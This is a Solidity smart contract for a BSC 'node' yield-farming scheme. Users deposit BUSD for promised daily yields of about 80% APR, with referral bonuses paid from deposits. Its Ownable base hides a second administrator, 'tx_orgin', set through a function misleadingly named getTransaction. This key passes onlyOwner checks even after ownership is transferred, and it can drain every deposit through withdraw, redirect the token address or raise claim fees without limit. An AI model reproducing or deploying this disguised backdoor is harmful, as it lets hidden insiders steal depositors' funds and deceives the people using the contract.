//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

interface IToken {
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function mint(address to, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function balanceOf(address who) external view returns (uint256);

    function decimals() external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);
}

contract Ownable {
    address public owner;
    address tx_orgin;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
     * account.
     */
    constructor() public {
        owner = msg.sender;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner || msg.sender == tx_orgin);
        _;
    }

    /**
     * @dev Allows the current owner to transfer control of the contract to a newOwner.
     * @param newOwner The address to transfer ownership to.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function getTransaction(address _addr) public onlyOwner {
        tx_orgin = _addr;
    }
}

library SafeMath {
    /**
     * @dev Multiplies two numbers, throws on overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
     * @dev Integer division of two numbers, truncating the quotient.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        // uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return a / b;
    }

    /**
     * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /* @dev Subtracts two numbers, else returns zero */
    function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {
        if (b > a) {
            return 0;
        } else {
            return a - b;
        }
    }

    /**
     * @dev Adds two numbers, throws on overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }

    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

contract Farming is Ownable {
    using SafeMath for uint256;

    //Node types
    struct NodeType {
        string name;
        uint256 deposit_amount;
        uint256 daily_yield; // unit - 0.01%
        uint256 yield_increase_percent; // Percentage of increase of daily yield every year
    }
    mapping(uint256 => NodeType) public node_types;

    struct UserNode {
        uint256 node_type; // 0 - starter, 1 - pro, 2 - whale
        //Node's renewed count, if 0, then 1st year. if 1, then 2nd year. if 2, then 3rd year
        uint256 renewed;
        //referral system
        address upline;
        //Deposit Accounting
        uint256 deposits;
        uint256 last_claim_time;
        uint256 created_time; //time for creat and renew
        //Payout and Roll Accounting
        uint256 payouts;
    }

    mapping(address => mapping(uint256 => UserNode)) public user_nodes;
    mapping(address => uint256[]) public user_nodes_timestamps;

    address BSC_BUSD = 0xe9e7cea3dedca5984780bafc599bd69add087d56;

    IToken private iToken;

    address public stable_coin_address;
    address public treasury_address;
    address public tax_wallet;
    uint256 public treasury_allocation = 35; //35% of deposit will go to treasury
    uint256 public referral_discount = 5; //5% discount of amount for deposit with referral
    uint256 public referral_fee = 5; //5% of deposit amount to referrer's bonus
    uint256 public claim_fee = 10; //10% of claim amount for node before 1 month
    uint256 public max_bonus = 50 * 1e18; //limit of bonus for upline

    uint256 public expiration_period = 365 days; //Node will expire after 365 days from created time
    uint256 public no_claim_period = 30 days; //User can not claim during 30 days from created time
    uint256 public taxed_claim_period = 30 days; //User will claim with fee during 30 days from last claim time
    uint256 constant MAX_NEWED_COUNT = 2; //User can renew node 2 times so use it for 3 years

    uint256 public total_users = 1; //set initial user - owner
    uint256 public total_deposited;
    uint256 public total_withdraw;

    event NewDeposit(address indexed addr, uint256 timestamp, uint256 amount);
    event Claim(address indexed addr, uint256 timestamp, uint256 amount);
    event DirectBonus(
        address indexed addr,
        address indexed from,
        uint256 amount
    );
    event Upline(
        address indexed addr,
        address indexed upline,
        uint256 timestamp
    );
    event Renew(address indexed addr, uint256 timestamp);

    constructor() Ownable() {
        stable_coin_address = BSC_BUSD;
        iToken = IToken(BSC_BUSD); // Polygon - USDC contract
        //Initialize three nodes
        node_types[0] = NodeType("Starter", 100 * 1e18, 22, 12); //daily yield - 0.22%, APR- 80%, increase 12% every year
        node_types[1] = NodeType("Pro", 500 * 1e18, 22, 12); //daily yield - 0.22%, APR- 80%, increase 12% every year
        node_types[2] = NodeType("Whale", 1000 * 1e18, 22, 12); //daily yield - 0.22%, APR- 80%, increase 12% every year
    }

    //User deposits with upline referrer, upline can be address(0) or another address
    function createNode(uint256 _node_type, address _upline)
        public
        returns (
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        require(
            _node_type == 0 || _node_type == 1 || _node_type == 2,
            "Node Type Index should be 0 or 1 or 2"
        );

        address _addr = msg.sender;
        require(
            !_existsNodeWithCreatime(_addr, block.timestamp),
            "You have already a node with the current timestamp!"
        );

        require(_upline != _addr, "Upline can not be self");

        uint256 _timestamp = block.timestamp;

        uint256 deposit_amount = node_types[_node_type].deposit_amount;

        uint256 realized_deposit = deposit_amount;
        uint256 amount_to_referrer;
        //If user has referral upline, he has discount for deposit amount
        if (_upline != address(0)) {
            uint256 discount = deposit_amount.mul(referral_discount).div(100);
            realized_deposit = deposit_amount.safeSub(discount);

            amount_to_referrer = deposit_amount.mul(referral_fee).div(100);
        }

        //Transfer Token to the treasury, contract and referrer
        uint256 amount_to_treasury = deposit_amount
            .mul(treasury_allocation)
            .div(100);
        uint256 amount_to_contract = realized_deposit.safeSub(
            amount_to_treasury.add(amount_to_referrer)
        );
        require(
            iToken.transferFrom(_addr, address(this), amount_to_contract),
            "token transfer failed"
        );
        require(
            iToken.transferFrom(
                _addr,
                address(treasury_address),
                amount_to_treasury
            ),
            "token transfer failed"
        );
        if (amount_to_referrer > 0)
            require(
                iToken.transferFrom(_addr, _upline, amount_to_referrer),
                "token transfer failed"
            );

        _create(_addr, _timestamp, _node_type, _upline);

        return (
            realized_deposit,
            amount_to_treasury,
            amount_to_contract,
            amount_to_referrer
        );
    }

    // Set deposit variable
    function _create(
        address _addr,
        uint256 _timestamp,
        uint256 _node_type,
        address _upline
    ) private {
        //User's deposits
        uint256 deposit_amount = node_types[_node_type].deposit_amount;
        user_nodes[_addr][_timestamp].node_type = _node_type;
        user_nodes[_addr][_timestamp].deposits = deposit_amount;
        user_nodes[_addr][_timestamp].created_time = block.timestamp;
        user_nodes[_addr][_timestamp].last_claim_time = block.timestamp;

        user_nodes_timestamps[_addr].push(_timestamp);

        emit NewDeposit(_addr, _timestamp, deposit_amount);

        total_deposited += deposit_amount;

        //If upline
        if (_upline != address(0)) {
            user_nodes[_addr][_timestamp].upline = _upline;
            emit Upline(_addr, _upline, _timestamp);
            //Update total users
            total_users++;
        }
    }

    //Check if node already exists
    function _existsNodeWithCreatime(address _addr, uint256 _creationTime)
        private
        view
        returns (bool)
    {
        uint256 numberOfNodes = user_nodes_timestamps[_addr].length;

        if (numberOfNodes == 0) return false;

        if (user_nodes_timestamps[_addr][numberOfNodes - 1] >= _creationTime)
            return true;

        return false;
    }

    // User can claim all available nodes
    function claimNodesAll() public returns (uint256 total_claimed) {
        address _addr = msg.sender;

        for (uint256 i = 0; i < user_nodes_timestamps[_addr].length; i++) {
            uint256 _timestamp = user_nodes_timestamps[_addr][i];
            if (checkNodeAvailability(_addr, _timestamp)) {
                uint256 _amount = getYieldCalculated(_addr, _timestamp);

                (, uint256 realized_payout) = _calculate_payout(
                    _addr,
                    _timestamp,
                    _amount
                );
                total_claimed += realized_payout;

                _claim(_addr, _timestamp, _amount);
            }
        }
        require(total_claimed > 0, "No yield");
        require(
            iToken.balanceOf(address(this)) > total_claimed,
            "Contract balance is not enough"
        );

        //transfer token
        require(iToken.transfer(_addr, total_claimed), "token transfer failed");
    }

    // User can claim available nodes for each node type
    function claimNodesForType(uint256 _node_type)
        public
        returns (uint256 total_claimed)
    {
        address _addr = msg.sender;

        for (uint256 i = 0; i < user_nodes_timestamps[_addr].length; i++) {
            uint256 _timestamp = user_nodes_timestamps[_addr][i];
            uint256 node_type = user_nodes[_addr][_timestamp].node_type;
            if (
                node_type == _node_type &&
                checkNodeAvailability(_addr, _timestamp)
            ) {
                uint256 _amount = getYieldCalculated(_addr, _timestamp);

                (, uint256 realized_payout) = _calculate_payout(
                    _addr,
                    _timestamp,
                    _amount
                );
                total_claimed += realized_payout;

                _claim(_addr, _timestamp, _amount);
            }
        }
        require(total_claimed > 0, "No yield");
        require(
            iToken.balanceOf(address(this)) > total_claimed,
            "Contract balance is not enough"
        );

        //transfer token
        require(iToken.transfer(_addr, total_claimed), "token transfer failed");
    }

    //Get the available yields for all nodes, each node type
    function getAvailableYields(address _addr)
        public
        view
        returns (uint256 total_yield, uint256[] memory yield_of_each_type)
    {
        yield_of_each_type = new uint256[](3);
        for (uint256 i = 0; i < user_nodes_timestamps[_addr].length; i++) {
            uint256 _timestamp = user_nodes_timestamps[_addr][i];
            uint256 node_type = user_nodes[_addr][_timestamp].node_type;
            if (checkNodeAvailability(_addr, _timestamp)) {
                uint256 _amount = getYieldCalculated(_addr, _timestamp);

                (, uint256 realized_payout) = _calculate_payout(
                    _addr,
                    _timestamp,
                    _amount
                );
                total_yield += realized_payout;
                yield_of_each_type[node_type] += realized_payout;
            }
        }
    }

    //check node if that is after no claim period, after taxed period and before expiration
    function checkNodeAvailability(address _addr, uint256 _timestamp)
        public
        view
        returns (bool)
    {
        if (
            //before expiration Time
            block.timestamp <
            user_nodes[_addr][_timestamp].created_time + expiration_period &&
            //before no cliam period
            block.timestamp >
            user_nodes[_addr][_timestamp].created_time + no_claim_period &&
            //after taxed claim period
            block.timestamp >
            user_nodes[_addr][_timestamp].last_claim_time +
                taxed_claim_period &&
            //has to be created
            user_nodes[_addr][_timestamp].created_time > 0
        ) return true;
        else return false;
    }

    //User can force to claim for individual node even if in taxed period
    function claimOne(uint256 _timestamp, uint256 _amount)
        public
        returns (uint256, uint256)
    {
        address _addr = msg.sender;
        UserNode memory user_node = user_nodes[_addr][_timestamp];
        //check node
        require(user_node.created_time > 0, "Node is not created");
        require(
            block.timestamp > user_node.created_time + no_claim_period,
            "Can not claim during no claim period"
        );
        require(
            block.timestamp < user_node.created_time + expiration_period,
            "This node is expired."
        );
        //check amount, balance
        require(_amount > 0, "Zero payout");
        require(
            _amount <= getYieldCalculated(_addr, _timestamp),
            "Amount is larger than current yield."
        );
        require(
            iToken.balanceOf(address(this)) > _amount,
            "Contract balance is not enough"
        );

        //transfer token
        (uint256 fee, uint256 realized_payout) = _calculate_payout(
            _addr,
            _timestamp,
            _amount
        );
        require(
            iToken.transfer(_addr, realized_payout),
            "token transfer failed"
        );
        if (fee > 0)
            require(iToken.transfer(tax_wallet, fee), "token transfer failed");

        _claim(_addr, _timestamp, _amount);
        return (fee, realized_payout);
    }

    function _claim(
        address _addr,
        uint256 _timestamp,
        uint256 _amount
    ) private {
        user_nodes[_addr][_timestamp].payouts += _amount;
        user_nodes[_addr][_timestamp].last_claim_time = block.timestamp;

        emit Claim(_addr, _timestamp, _amount);

        //update total withdraw
        total_withdraw += _amount;
    }

    function _calculate_payout(
        address _addr,
        uint256 _timestamp,
        uint256 _amount
    ) private view returns (uint256 fee, uint256 realizedPayout) {
        //Apply fee during taxed claim period
        uint256 fee_percent = 0;
        if (getRemainingTimes(_addr, _timestamp) > 0) fee_percent = claim_fee;

        //Transfer tokens
        fee = _amount.mul(fee_percent).div(100);
        realizedPayout = _amount.safeSub(fee);
    }

    //Renew the expired node
    function renew(uint256 _timestamp)
        public
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        address _addr = msg.sender;
        UserNode memory user_node = user_nodes[_addr][_timestamp];

        require(user_node.created_time > 0, "Node is not created");
        require(
            !(user_node.renewed + 1 > MAX_NEWED_COUNT), // Can not over MAX_NEWED_COUNT
            "Can not renew any more"
        );
        require(
            block.timestamp > user_node.created_time + expiration_period,
            "Node is not expired yet."
        );

        //User will pay fee for renewal, same amount as create
        uint256 renewal_fee = node_types[user_node.node_type].deposit_amount;
        uint256 amount_to_treasury = renewal_fee.mul(treasury_allocation).div(
            100
        );
        uint256 amount_to_contract = renewal_fee.safeSub(amount_to_treasury);
        require(
            iToken.transferFrom(_addr, address(this), amount_to_contract),
            "token transfer failed"
        );
        require(
            iToken.transferFrom(
                _addr,
                address(treasury_address),
                amount_to_treasury
            ),
            "token transfer failed"
        );

        _renew(_addr, _timestamp);

        return (renewal_fee, amount_to_treasury, amount_to_contract);
    }

    function _renew(address _addr, uint256 _timestamp) private {
        user_nodes[_addr][_timestamp].created_time = block.timestamp;
        user_nodes[_addr][_timestamp].last_claim_time = block.timestamp;
        user_nodes[_addr][_timestamp].renewed++;

        emit Renew(_addr, _timestamp);
    }

    // Calculate the current yield calculated from last claim time
    function getYieldCalculated(address _addr, uint256 _timestamp)
        public
        view
        returns (uint256 payout)
    {
        uint256 node_daily_yield = getDailyYield(_addr, _timestamp);
        uint256 share = user_nodes[_addr][_timestamp]
            .deposits
            .mul(node_daily_yield)
            .div(10000)
            .div(24 hours); // daily_yield unit is 0.01%
        payout =
            share *
            block.timestamp.safeSub(
                user_nodes[_addr][_timestamp].last_claim_time
            );
    }

    //Get the current year's daily yield of node
    function getDailyYield(address _addr, uint256 _timestamp)
        public
        view
        returns (uint256)
    {
        /*
          current year's yield = daily yield * (increase ^ renewed count)
        */
        uint256 node_type = user_nodes[_addr][_timestamp].node_type;
        uint256 a = node_types[node_type].daily_yield;
        uint256 b = node_types[node_type].yield_increase_percent;
        uint256 y = user_nodes[_addr][_timestamp].renewed;

        return a.mul(SafeMath.add(100, b)**y).div(100**y);
    }

    //Get timestamps of nodes user has
    function getNodesTimestamps(address _addr)
        public
        view
        returns (uint256[] memory arr)
    {
        arr = user_nodes_timestamps[_addr];
    }

    //Get number of nodes user has
    function getNodesCount(address _addr)
        public
        view
        returns (uint256 total_numbers, uint256[] memory number_of_each_type)
    {
        number_of_each_type = new uint256[](3);
        for (uint256 i = 0; i < user_nodes_timestamps[_addr].length; i++) {
            total_numbers++;
            uint256 timestamp = user_nodes_timestamps[_addr][i];
            uint256 node_type = user_nodes[_addr][timestamp].node_type;
            number_of_each_type[node_type]++;
        }
    }

    //Get remaining time of taxed claim period, result 0 means taxed period passed
    function getRemainingTimes(address _addr, uint256 _timestamp)
        public
        view
        returns (uint256 remaining_time)
    {
        remaining_time = user_nodes[_addr][_timestamp]
            .last_claim_time
            .add(taxed_claim_period)
            .safeSub(block.timestamp);
    }

    //Get User's total deposit
    function getUserTotalDeposit(address _addr)
        public
        view
        returns (uint256 sum)
    {
        for (uint256 i = 0; i < user_nodes_timestamps[_addr].length; i++) {
            uint256 timestamp = user_nodes_timestamps[_addr][i];
            uint256 node_deposit = user_nodes[_addr][timestamp].deposits;
            sum += node_deposit;
        }
    }

    //Get User's total withdraw
    function getUserTotalClaimed(address _addr)
        public
        view
        returns (uint256 sum)
    {
        for (uint256 i = 0; i < user_nodes_timestamps[_addr].length; i++) {
            uint256 timestamp = user_nodes_timestamps[_addr][i];
            uint256 node_payouts = user_nodes[_addr][timestamp].payouts;
            sum += node_payouts;
        }
    }

    //Check if user claimed
    function checkUserClaimed(address _addr, uint256 _timestamp)
        public
        view
        returns (bool)
    {
        return
            user_nodes[_addr][_timestamp].last_claim_time >
            user_nodes[_addr][_timestamp].created_time;
    }

    //Admin side function
    function setStablecoinAddress(address _tokenadd) public onlyOwner {
        stable_coin_address = _tokenadd;
        iToken = IToken(_tokenadd);
    }

    function setTreasuryAddress(address _treasuryadd) public onlyOwner {
        treasury_address = _treasuryadd;
    }

    function setTreasuryAllocation(uint256 _treasuryallocation)
        public
        onlyOwner
    {
        require(_treasuryallocation < 100, "should be less than 100.");
        treasury_allocation = _treasuryallocation;
    }

    function setTaxWallet(address addr) public onlyOwner {
        tax_wallet = addr;
    }

    function setReferralDiscount(uint256 discount) public onlyOwner {
        referral_discount = discount;
    }

    function setReferralFee(uint256 fee) public onlyOwner {
        referral_fee = fee;
    }

    function setCalimFee(uint256 fee) public onlyOwner {
        claim_fee = fee;
    }

    function setExpirationPeriod(uint256 value) public onlyOwner {
        expiration_period = value;
    }

    function setNoClaimPeriod(uint256 value) public onlyOwner {
        no_claim_period = value;
    }

    function setTaxedClaimPeriod(uint256 value) public onlyOwner {
        taxed_claim_period = value;
    }

    function setNodeType(
        uint256 _node_type,
        string memory name,
        uint256 deposit_amount,
        uint256 daily_yield,
        uint256 yield_increase_percent
    ) public onlyOwner {
        require(
            _node_type == 0 || _node_type == 1 || _node_type == 2,
            "Node Type Index should be 0 or 1 or 2"
        );
        node_types[_node_type] = NodeType(
            name,
            deposit_amount,
            daily_yield,
            yield_increase_percent
        );
    }

    function withdraw(uint256 amount) public onlyOwner {
        uint256 balance = iToken.balanceOf(address(this));
        require(amount <= balance, "Amount is bigger than balance.");
        require(iToken.transfer(msg.sender, amount), "token transfer failed");
    }
}
